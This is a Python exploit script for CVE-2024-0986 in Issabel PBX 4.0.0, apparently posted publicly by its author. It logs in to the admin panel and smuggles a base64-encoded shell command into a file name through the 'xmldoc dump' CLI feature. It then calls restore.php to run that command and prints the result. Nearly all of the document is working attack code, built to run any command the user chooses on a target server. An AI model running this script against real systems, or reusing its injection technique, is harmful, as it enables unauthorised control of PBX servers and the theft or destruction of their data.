#!/usr/bin/python3
import requests
import argparse
import sys
import signal
import base64
import time
import warnings


"""
Issabel PBX 4.0.0 Remote Code Execution - Authenticated
(CVE-2024-0986)

Description: Issabel PBX 4.0.0 allows a logged in user to upload files using 'xmldoc' and 'dump' command. 
This allow to execute remote commands based on the name of the uploaded files abusing 'restore.php' file

More info and sources:
https://nvd.nist.gov/vuln/detail/CVE-2024-0986
https://github.com/advisories/GHSA-v9pc-9fc9-4ff8
https://www.opencve.io/cve/CVE-2024-0986

Created by: gunzf0x (https://github.com/gunzf0x)
"""

# Define color dictionary
color = {
    "RESET": '\033[0m',
    "RED": '\033[91m',
    "GREEN": '\033[92m',
    "YELLOW": '\033[93m',
    "BLUE": '\033[94m',
    "MAGENTA": '\033[95m',
    "CYAN": '\033[96m',
    "WHITE": '\033[97m'
}


# Define some pretty characters
STAR: str = f"{color['YELLOW']}[{color['BLUE']}*{color['YELLOW']}]{color['RESET']}"
WARNING_STR: str = f"{color['RED']}[{color['YELLOW']}!{color['RED']}]{color['RESET']}"
# Add a generic header for the requests we will make later
generic_header ={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
                 "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", 
                 "Content-Type": "application/x-www-form-urlencoded"}


# Ctrl+C
def signal_handler(sig, frame)->None:
    print(f"\n{WARNING_STR} {color['RED']}Ctrl+C! Exiting...{color['RESET']}")
    sys.exit(0)


# Capture Ctrl+C
signal.signal(signal.SIGINT, signal_handler)


def print_banner()->None:
    print(f"""
{color['MAGENTA']} ___               _          _      
|_ _|___ ___  __ _| |__   ___| |     
 | |/ __/ __|/ _` | '_ \ / _ \ |     
 | |\__ \__ \ (_| | |_) |  __/ |     
|___|___/___/\__,_|_.__/ \___|_|     
{color['CYAN']} ____  ______  __  ____   ____ _____ 
|  _ \| __ ) \/ / |  _ \ / ___| ____|
| |_) |  _  \\  /  | |_) | |   |  _|  
|  __/| |_) /  \  |  _ <| |___| |___ 
|_|   |____/_/\_\ |_| \_ \\____|_____| 
v4.0.0                    by gunzf0x
{color['RESET']}""")


def check_len_args()->None:
    """
    Check if the user has provided some arguments
    """
    if len(sys.argv) <= 1:
        print(f"{color['GREEN']}Example usage: {color['BLUE']}python3 {sys.argv[0]} -t 'https://192.1.1.1' -u 'pedrito' -p 'meelectrocutaste'{color['RESET']}")
        sys.exit(1)
    return


def parse_arguments()->argparse.Namespace:
    """
    Get argument/flags from users
    """
    parser = argparse.ArgumentParser(prog=f'python3 {sys.argv[0]}',
                                     description=f'{color["CYAN"]}Issabel PBX 4.0.0 - Authenticated RCE{color["RESET"]}',
                                     epilog=f"""
{color['YELLOW']}Example usages:{color['RESET']}
python3 {sys.argv[0]} -t https://192.1.1.1 -u '<username>' -p '<password>'
python3 {sys.argv[0]} -t 192.1.1.1 -u '<username>' -p <password>""",
                                     formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-t', '--target', type=str, help='Target IP (e.g., "192.1.1.1" or "https://192.1.1.1" are valid).', required=True)
    parser.add_argument('-u', '--user', type=str, help='Username.', required=True)
    parser.add_argument('-p', '--password', type=str, help='Password for this username.', required=True)
    parser.add_argument('-c', '--command', type=str, help="Unix command to execute in the machine.")
    parser.add_argument('--port', type=int, help='Port running Issabel PBX service. Default: 443.', default=443)
    parser.add_argument('--not-b64', action='store_true', help=f"Do not base64 encode the payload/command.\nWarning: With this option enabled, payload might fail for commands\nwith spaces and/or characters such as ', \", - (among others).")
    parser.add_argument('--no-banner', action='store_true', help='Do not print banner')
    parser.add_argument('--show-warnings', action='store_false', help='Show warnings (if there are).')

    args = parser.parse_args()
    return args


def check_if_https_in_url(url: str, port: int)->str:
    """
    Check the 'target' argument the user has provided
    """
    if not url.startswith('https://') and not url.startswith('http://'):
        return f"https://{url}:{port}"
    return f"{url}:{port}"


def injection_file_failed(response_text: str):
    # Search for the words 'Command' and 'failed'. This might indicate that the payload could not be uploaded
    for line in response_text.split('\n'):
        if ('Command' in line) and ('failed' in line):
            return True, line
    return False, None


def sanitize_output(payload_response: str)->str:
    """
    Sanitize payload output from undesired HTML code
    """
    payload_response = payload_response.replace("<br>", '')
    payload_response = payload_response.replace("</div><script>alert('Migration Complete');</script>", '')
    index_of_greater_than = payload_response.find(">")
    if index_of_greater_than != -1:
        # Extract the substring starting from the character after '>'
        sanitized_response = payload_response[index_of_greater_than + 1:].strip()
        return sanitized_response
    return payload_response


def login_request(url: str, args: argparse.Namespace)->requests.sessions.Session|None:
    """
    Login request to Issabel panel
    """
    # Create a generic cookie
    generic_cookie = {"issabelSession": "koglv53li3kpgba8ebol01brt4"} 
    # Create login data for Issabel
    login_data = {"input_user": args.user, "input_pass": args.password, "submit_login": ''}
    # Make the login request to the server
    print(f"{STAR} {color['GREEN']}Trying to log in to {color['YELLOW']}{url!r}{color['GREEN']} with credential {color['YELLOW']}'{args.user}:{args.password}'{color['GREEN']}... {color['RESET']}")
    try:
        # Make a request with a generic session
        session = requests.Session()
        r = session.post(url, headers=generic_header, cookies=generic_cookie, data=login_data, verify=False) # verify=False to avoid 'SSL' cert problems (this will print a warning message anyways)
        if 'Incorrect username or password. Please try again.' in r.text:
            print(f"{WARNING_STR} {color['RED']}Invalid username or password. Please check and try again{color['RESET']}")
            sys.exit(1)
        if r.status_code != 200:
            print(f"{WARNING_STR} {color['RED']} Ups! Something happened! Got status code {r.status_code!r} =({color['RESET']}")
            sys.exit(1)
    except Exception as e:
        print(f"{WARNING_STR}{color['RED']} An error ocurred:\n{color['YELLOW']}{e}{color['RESET']}")
        sys.exit(1)
    print(f"{STAR} {color['GREEN']}Authentication succesful!{color['RESET']}")
    return session


def upload_payload(url: str, session: requests.sessions.Session, args: argparse.Namespace)->str|None:
    if args.command is None or args.command == '':
        print(f"{WARNING_STR} No command provided ('--command')")
        sys.exit(1)
    print(f"{STAR} {color['GREEN']}Uploading the payload...{color['RESET']}")
    payload_url: str = f"{url}/index.php?menu=asterisk_cli"
    if not args.not_b64:
        encoded_command: str = base64.urlsafe_b64encode(args.command.encode()).decode().replace('\n','') 
        payload_injected: str = f"{{echo,{encoded_command}}}|{{base64,-d}}|bash"
    else:
        payload_injected = args.command
    payload_data = {'txtCommand': f'xmldoc dump /var/www/backup/x|{payload_injected}'}
    r = requests.post(payload_url, headers=generic_header, cookies=session.cookies.get_dict(), data=payload_data, verify=False)
    injection_failed, fail_line = injection_file_failed(r.text)
    if injection_failed:
        print(f"{WARNING_STR} Uploading malicious file failed...")
        print(fail_line)
        sys.exit(1)
    return payload_injected


def request_payload(url: str, session:requests.sessions.Session, injected_payload: str):
    print(f"{STAR} {color['GREEN']}Requesting the uploaded payload...{color['RESET']}")
    # Wait a couple of seconds to ensure the payload has been uploaded
    time.sleep(2)
    payload_url = f"{url}/modules/backup_restore/restore.php?filename=x|{injected_payload}"
    r = requests.get(payload_url, headers=generic_header, cookies=session.cookies.get_dict(), verify=False)
    if "is not a file" in r.text:
        print(f"{WARNING_STR} Could not execute the command :( This is the output")
    if "Error!" in r.text:
        print(f"{WARNING_STR} We were able to remotely execute commands on the target but it gave an error:")
    print("\n"+sanitize_output(r.text))


def exploit(args: argparse.Namespace)->None:
    # Check url
    url = check_if_https_in_url(args.target, args.port)
    # Log in
    session = login_request(url, args)
    # Once logged in, upload the payload
    payload = upload_payload(url, session, args)
    # Request the payload
    request_payload(url, session, payload)
    

def main()->None:
    # Check if user has provided (or not) flags
    check_len_args()
    # Get arguments from user
    args = parse_arguments()
    # Print my pretty banner made with love
    if not args.no_banner:
        print_banner()
    # By default, ignore all warnings (related to unsecure SSL connections)
    if args.show_warnings:
        warnings.filterwarnings("ignore")
    # Run the exploit and pray it works
    exploit(args)


if __name__ == "__main__":
    main()
